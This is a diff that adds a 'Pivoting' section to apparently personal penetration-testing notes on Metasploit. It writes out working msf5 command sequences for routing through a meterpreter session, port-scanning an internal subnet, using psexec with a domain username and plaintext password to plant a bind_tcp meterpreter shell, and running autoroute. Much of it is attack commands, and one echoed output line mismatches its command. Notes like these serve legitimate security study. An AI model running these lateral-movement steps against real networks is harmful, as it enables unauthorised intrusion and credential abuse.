@@ -132,6 +132,65 @@ meterpreter > getsystem
 meterpreter > creds_msv
 ```
 
+
+### Pivoting
+
+^8f3ca2
+
+^6aac08
+We will use route and add to create a path to the alternate internal network subnet we discovered. We will also specify the session ID that this route will apply to:
+```
+msf5 > route add 192.168.1.0/24 11
+[*] Route added
+msf5 > route print
+```
+We can now portscan into this network
+```
+msf5 > use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
+RHOSTS => 192.168.1.110
+msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+PORTS => 445,3389
+msf5 auxiliary(scanner/portscan/tcp) > run
+```
+We can also pivot using the psexec module:
+```
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec_psh) > set SMBDomain corp
+SMBDomain => corp
+msf5 exploit(windows/smb/psexec_psh) > set SMBUser jeff_admin
+SMBUser => jeff_admin
+msf5 exploit(windows/smb/psexec_psh) > set SMBPass Qwerty09!
+SMBPass => Qwerty09!
+msf5 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.110
+RHOSTS => 192.168.1.110
+msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp
+payload => windows/meterpreter/bind_tcp
+msf5 exploit(windows/smb/psexec_psh) > set RHOST 192.168.1.110
+LHOST => 192.168.1.110
+msf5 exploit(windows/smb/psexec_psh) > set LPORT 444
+LPORT => 444
+msf5 exploit(windows/smb/psexec_psh) > exploit
+```
+It’s important to note that the added route will only work with established connections, meaning that a new shell. A reverse shell would not be able to find it's way back to the attacking machine.
+
+As an alternative to adding routes manually, we can use the autoroute post-exploitation module, which can set up pivot routes through an existing meterpreter session automatically.
+
+```
+msf5 exploit(multi/handler) > use multi/manage/autoroute
+msf5 post(multi/manage/autoroute) > show options
+msf5 post(multi/manage/autoroute) > set session 4
+msf5 post(multi/manage/autoroute) > exploit
+
+```
+
+Setup a socks proxy:
+[[SOCKS Proxies#^8b8d22]]
+
+Port forward:
+[[Port Forwards#^651985]]
+
+
 ___
 
 ## Resources:
